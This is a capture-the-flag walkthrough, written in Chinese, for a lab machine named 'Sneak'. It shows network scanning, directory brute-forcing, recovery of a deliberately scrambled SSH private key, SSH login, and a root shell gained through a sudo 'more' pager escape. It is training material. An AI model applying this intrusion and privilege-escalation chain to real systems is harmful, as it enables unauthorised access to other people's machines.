![image-20250715221242195](https://7r1umphk.github.io/image/20250715221302013.webp)

继续补wp

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.186 08:00:27:d2:ee:10       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.186
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:13 EDT
Nmap scan report for 192.168.205.186
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D2:EE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
                                                                          
```

看web

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/ -v                                                                 
*   Trying 192.168.205.186:80...
* Connected to 192.168.205.186 (192.168.205.186) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.205.186
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 15 Jul 2025 14:14:11 GMT
< Server: Apache/2.4.62 (Debian)
< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
< ETag: "6-6328b152a4f57"
< Accept-Ranges: bytes
< Content-Length: 6
< Content-Type: text/html
< 
index
* Connection #0 to host 192.168.205.186 left intact
                                             
```

群里面的模板，那直接爆破目录吧

有个cms

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/cms                  (Status: 301) [Size: 316] [--> http://192.168.205.186/cms/]
```

继续爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.186/cms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.186/cms
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 500) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/content              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/content/]
/modules              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/modules/]
/rss.php              (Status: 500) [Size: 0]
/core                 (Status: 301) [Size: 321] [--> http://192.168.205.186/cms/core/]
/license.txt          (Status: 200) [Size: 2602]
/install              (Status: 301) [Size: 324] [--> http://192.168.205.186/cms/install/]
/lib                  (Status: 301) [Size: 320] [--> http://192.168.205.186/cms/lib/]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 323] [--> http://192.168.205.186/cms/styles/]
/robots.txt           (Status: 200) [Size: 104]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/acp                  (Status: 301) [Size: 320] [--> http://192.168.205.186/cms/acp/]
```

扒拉

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.186/cms/license.txt   
-----YEK ETAVIRP HSSNEPO NIGEB-----
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
==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8
-----END OPENSSH PRIVATE KEY-----
               
```

出货啦，出货啦，哈哈哈

看着像ssh私钥，但是好像被处理过

看起来像单行反转，因为第一行的头是被rev的，第二行没问题，最后一行没问题，所以直接反转回去吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd ~/tmp                                                  
            
┌──(kali㉿kali)-[~/tmp]
└─$ curl http://192.168.205.186/cms/license.txt -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2602  100  2602    0     0  1267k      0 --:--:-- --:--:-- --:--:-- 2541k
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ awk 'NR%2==1 {system("echo \047"$0"\047 | rev"); next} 1' id_rsa > id_rsa1
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ chmod 600 id_rsa1                                    
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ ssh-keygen -y -f id_rsa1
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk/ZcOb/YUyfx7uI7lTYwamUZMR9vv6q97X+ga1pYrU0xLn910Czy+1chL3iNh7Ai45DepLnJrkRPejQ6TfeTmb2jL56R3YDygeIklQEPwI+y38FHg8wz44hir1CCcAn2dlV2Mi/MKtjVjMa2C8JYUWM065yTN5PMcrlY/1m6aAtJH8n7wpPh81SHYDY6C4KD8xF7yos5EMWhyuUa36Hg1R+uDFqgFCEl+Ixn3KBkDXFh0L/km0K5d4C8zr2NEQ5rEsDXfTb5Jn2hO7OJkGA7jtJDa917+e+X9sCdsB4PxFg5VzDWqREngHj7YoSd4QpQLgTC4Ca7YLP6RA2sQqpw9S/8ISOc4vnbbkdgDlYhRo49tLjAis97AtcxnhQImsNHmqHZWUmAbFuTHzpGOVhDmqLN3z/oZ8szRFG/yD7kowBGUhCbwfvGp1KgJYWGhpKE6zIwZA4CXndPHEox+LHXI+8IwXiQqiDOZw5HpFUD6NORUHzbUkpLd7jpjkOgqHs= sysadm@Sneak
```

连接

```
┌──(kali㉿kali)-[~/tmp]
└─$ ssh sysadm@192.168.205.186 -i id_rsa1
The authenticity of host '192.168.205.186 (192.168.205.186)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
    (13 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.186' (ED25519) to the list of known hosts.
Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadm@Sneak:~$ id
uid=1002(sysadm) gid=1003(sysadm) groups=1003(sysadm)
sysadm@Sneak:~$ sudo -l
Matching Defaults entries for sysadm on Sneak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sysadm may run the following commands on Sneak:
    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh
```

more是个分页器所以你缩小屏幕执行/usr/bin/more /var/log/custom/fake-cleanup.sh让他一页显示不了就可以了

![image-20250715222326570](https://7r1umphk.github.io/image/20250715222326683.webp)

> [!Tip]
>
> sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
> 然后显示百分比
>
> 输入!/bin/bash

```
root@Sneak:/home/sysadm# iduid=0(root) gid=0(root) groups=0(root                   
root@Sneak:/home/sysadm# cat /root/root.txt /home/user/user.txt 
flag{root-36bee2f8db4943b0f6c9d16afe11d454}                                         
flag{user-9fcae37cb857fb5fc6f8d74c82a5d0ga}                                         
```

或者改stty也可以

```
sysadm@Sneak:~$ stty rows 2
sysadm@Sneak:~$ sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
# System cleanup script - DO NOT MODIFY
!/bin/bash
root@Sneak:/home/sysadm# id
uid=0(root) gid=0(root) groups=0(root)
```

